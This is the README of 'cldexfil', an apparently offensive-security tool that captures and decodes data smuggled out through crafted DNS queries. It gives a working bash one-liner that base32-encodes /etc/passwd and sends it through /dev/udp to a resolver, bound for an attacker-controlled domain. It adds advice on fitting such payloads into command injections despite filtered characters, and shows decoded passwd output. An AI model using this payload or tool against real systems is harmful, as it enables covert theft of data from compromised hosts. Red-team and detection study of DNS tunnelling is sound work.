# cldexfil
Client-Less Data Exfiltration over DNS

`cldexfil` is a bare-simple tool to passively read exfiltrated data on DNS
queries. It listens and captures specially crafted Domain Name System (DNS)
queries on an interface of your choosing, decode and print them on your screen.

At this time of writing [cldexfil.py](cldexfil.py) is relatively limited
feature-wise, but as new client-less exfiltration methods (see Exfiltration
methods below) will be experimented, more features will be added.


## Why?
Very frequently you cannot easily get a shell and directly exfiltrate data from
a compromised target, thanks to blind command injections, NGFWs and WAFs among
other things. What is left to you is a bare host environment (or an hardened
version) with the only capability to send DNS queries to the organization's DNS
forwarder(s). This is a very common scenario in today's _secured_ networks where
hosts rely solely on DNS resolutions to perform their tasks.

During some experiments, I found out that most Linux and Unix environments
ships with all the necessary tools to craft valid DNS queries and therefore,
attackers (presumably you with good intents) can exfiltrate valuable information
through the (frequently trusted) DNS channel.

`cldexfil` can tolerate and compensate for base32 padding issues, however it
does not differentiate legitimate DNS queries from forged ones.


## Exfiltration methods
Several client-less exfiltration methods do exist, one particularly useful and
which has been the catalyst to the creation of this tool is the use of the
bash's `/dev/udp redirection` feature to craft valid DNS queries. The latter are
forwarded by the host's trusted forwarder(s) to the authoritative DNS server you
control (or for which you can intercept traffic).

Let's see an example of a one-liner bash command which can be used as a payload.
The below command uses the `base32`, `echo` and `cat` commands combined, all are
part of GNU coreutils, the latter is included in the base install of many Linux
distributions:
```
$ cat /etc/passwd | base32 -w63 | while read E; do ( echo -ne "\x7a\x69\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x3f" && echo -n $E && echo -ne "\x04\x74\x6f\x6f\x72\x02\x73\x69\x00\x00\x01\x00\x01" ) | cat > /dev/udp/8.8.8.8/53; done
```

The first command concatenates and prints the content of the `/etc/passwd` file
on standard output. It's then piped to the `base32` utility so 63-bytes names
are created and read individually. For every lines (or names), the `echo`
command produces a DNS query and send it through the shell `/dev/udp`
pseudo-device, to the specified DNS forwarder.

Worth mentioning is the fact the binary string passed to the first `echo`
command includes the `recursion desired` bit set and an hard-coded transaction
id. The last `echo` command includes the domain name, the class and type of the
query; above `A` records were used (0x1) within the `IN` class (0x0001).

Please note the above queries' length are hard-coded to 63 bytes (0x3F),
therefore the last created hostname will probably not be aligned on a 63 bytes
boundary and it will results in a malformed DNS query.

In presence of command injection vulnerabilities you frequently have a list of
bad characters you cannot inject, such as the semi-colon `;` or the back-slash
`\`, the above example is of no use in such cases, and alternative characters
or command expressions may be needed. Also keep in mind that most methods
described here, do not provide data confidentiality and integrity.

The above command can certainly be optimized and has room for improvements via
additional experimentations. `cldexfil` supports variable-length queries as soon
as the sub-domain can be extracted and decoded using base32. The python script
has been deliberately kept simple for these reasons.

Also keep in mind that reliability and behaviors may vary from implementations
to implementations, and between shells versions.


## Practical examples
`cldexfil` can be used in a lot of exploitation scenarios. This project's
[wiki](https://github.com/e3prom/miscsec/wiki/cldexfil) includes a few practical
examples of *client-less* data exfiltration over DNS through the exploitation of
well known vulnerabilities such as RCEs.


## Dependencies
 * Python 2.7
 * Scapy (https://github.com/secdev/scapy)


## Running
Simply run [cldexfil.py](cldexfil.py) by specifying the network interface you
want to listen on (may require root privilege). The tool will passively extract
DNS queries (a source can optionally be given with the '-s' switch) and decode
them to standard output.

```
$ sudo ./cldexfil/cldexfil.py -s 8.8.8.8 --verbose eth0
[*] listening on eth0 for DNS queries
[*] hit CTRL-C to decode data received
Ether / IP / UDP / DNS Qry "OJXW65B2PA5DAORQHJZG633UHIXXE33POQ5C6YTJNYXWEYLTNAFGIYLFNVXW4OT.toor.si."
Ether / IP / UDP / DNS Qry "YHIYTUMJ2MRQWK3LPNY5C65LTOIXXGYTJNY5C65LTOIXXGYTJNYXW433MN5TWS3.toor.si."
Ether / IP / UDP / DNS Qry "QKMJUW4OTYHIZDUMR2MJUW4ORPMJUW4ORPOVZXEL3TMJUW4L3ON5WG6Z3JNYFHG.toor.si."
Ether / IP / UDP / DNS Qry "6LTHJ4DUMZ2GM5HG6LTHIXWIZLWHIXXK43SF5ZWE2LOF5XG63DPM5UW4CTTPFXG.toor.si."
Ether / IP / UDP / DNS Qry "GOTYHI2DUNRVGUZTIOTTPFXGGORPMJUW4ORPMJUW4L3TPFXGGCTHMFWWK4Z2PA5.toor.si."
Ether / IP / UDP / DNS Qry "DKORWGA5GOYLNMVZTUL3VONZC6Z3BNVSXGORPOVZXEL3TMJUW4L3ON5WG6Z3JNY.toor.si."
Ether / IP / UDP / DNS Qry "FG2YLOHJ4DUNR2GEZDU3LBNY5C65TBOIXWGYLDNBSS63LBNY5C65LTOIXXGYTJN.toor.si."
Ether / IP / UDP / DNS Qry "YXW433MN5TWS3QKNRYDU6B2G45DOOTMOA5C65TBOIXXG4DPN5WC63DQMQ5C65LT.toor.si."
Ether / IP / UDP / DNS Qry "OIXXGYTJNYXW433MN5TWS3QKNVQWS3B2PA5DQORYHJWWC2LMHIXXMYLSF5WWC2L.toor.si."
Ether / IP / UDP / DNS Qry "MHIXXK43SF5ZWE2LOF5XG63DPM5UW4CTOMV3XGOTYHI4TUOJ2NZSXO4Z2F53GC4.toor.si."
Ether / IP / UDP / DNS Qry "RPONYG633MF5XGK53THIXXK43SF5ZWE2LOF5XG63DPM5UW4CTVOVRXAOTYHIYTA.toor.si."
Ether / IP / UDP / DNS Qry "ORRGA5HK5LDOA5C65TBOIXXG4DPN5WC65LVMNYDUL3VONZC643CNFXC63TPNRXW.toor.si."
Ether / IP / UDP / DNS Qry "O2LOBJYHE33YPE5HQORRGM5DCMZ2OBZG66DZHIXWE2LOHIXXK43SF5ZWE2LOF5X.toor.si."
Ether / IP / UDP / DNS Qry "G63DPM5UW4CTXO53S2ZDBORQTU6B2GMZTUMZTHJ3XO5ZNMRQXIYJ2F53GC4RPO5.toor.si."
Ether / IP / UDP / DNS Qry "3XOORPOVZXEL3TMJUW4L3ON5WG6Z3JNYFGEYLDNN2XAOTYHIZTIORTGQ5GEYLDN.toor.si."
Ether / IP / UDP / DNS Qry "N2XAORPOZQXEL3CMFRWW5LQOM5C65LTOIXXGYTJNYXW433MN5TWS3QKNRUXG5B2.toor.si."
Ether / IP / UDP / DNS Qry "PA5DGOB2GM4DUTLBNFWGS3THEBGGS43UEBGWC3TBM5SXEORPOZQXEL3MNFZXIOR.toor.si."
Ether / IP / UDP / DNS Qry "POVZXEL3TMJUW4L3ON5WG6Z3JNYFGS4TDHJ4DUMZZHIZTSOTJOJRWIORPOZQXEL.toor.si."
Ether / IP / UDP / DNS Qry "3SOVXC62LSMNSDUL3VONZC643CNFXC63TPNRXWO2LOBJTW4YLUOM5HQORUGE5DI.toor.si."
Ether / IP / UDP / DNS Qry "MJ2I5XGC5DTEBBHKZZNKJSXA33SORUW4ZZAKN4XG5DFNUQCQYLENVUW4KJ2F53G.toor.si."
Ether / IP / UDP / DNS Qry "C4RPNRUWEL3HNZQXI4Z2F52XG4RPONRGS3RPNZXWY33HNFXAU3TPMJXWI6J2PA5.toor.si."
Ether / IP / UDP / DNS Qry "DMNJVGM2DUNRVGUZTIOTON5RG6ZDZHIXW433OMV4GS43UMVXHIORPOVZXEL3TMJ.toor.si."
Ether / IP / UDP / DNS Qry "UW4L3ON5WG6Z3JNYFHG6LTORSW2ZBNORUW2ZLTPFXGGOTYHIYTAMB2GEYDGOTTP.toor.si."
Ether / IP / UDP / DNS Qry "FZXIZLNMQQFI2LNMUQFG6LOMNUHE33ONF5GC5DJN5XCYLBMHIXXE5LOF5ZXS43U.toor.si."
Ether / IP / UDP / DNS Qry "MVWWIORPMJUW4L3GMFWHGZIKON4XG5DFNVSC23TFOR3W64TLHJ4DUMJQGE5DCMB.toor.si."
Ether / IP / UDP / DNS Qry "UHJZXS43UMVWWIICOMV2HO33SNMQE2YLOMFTWK3LFNZ2CYLBMHIXXE5LOF5ZXS4.toor.si."
Ether / IP / UDP / DNS Qry "3UMVWWIL3OMV2GSZR2F5RGS3RPMZQWY43FBJZXS43UMVWWILLSMVZW63DWMU5HQ.toor.si."
Ether / IP / UDP / DNS Qry "ORRGAZDUMJQGU5HG6LTORSW2ZBAKJSXG33MOZSXELBMFQ5C64TVNYXXG6LTORSW.toor.si."
Ether / IP / UDP / DNS Qry "2ZBPOJSXG33MOZSTUL3CNFXC6ZTBNRZWKCTTPFZXIZLNMQWWE5LTFVYHE33YPE5.toor.si."
Ether / IP / UDP / DNS Qry "HQORRGAZTUMJQGY5HG6LTORSW2ZBAIJ2XGICQOJXXQ6JMFQWDUL3SOVXC643ZON.toor.si."
Ether / IP / UDP / DNS Qry "2GK3LEHIXWE2LOF5TGC3DTMUFG2ZLTONQWOZLCOVZTU6B2GEYDIORRGA3TUORPO.toor.si."
Ether / IP / UDP / DNS Qry "ZQXEL3SOVXC6ZDCOVZTUL3CNFXC6ZTBNRZWKCSEMVRGSYLOFVSXQ2LNHJ4DUMJQ.toor.si."
Ether / IP / UDP / DNS Qry "GU5DCMJQHI5C65TBOIXXG4DPN5WC6ZLYNFWTIORPMJUW4L3GMFWHGZIKtoors."
^C
[*] Decoding exfiltrated data...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
Debian-exim:x:10
```


## Contribution
Feel free to share your contribution, if you feel inclined to.


## License
GNU General Public License v3.0
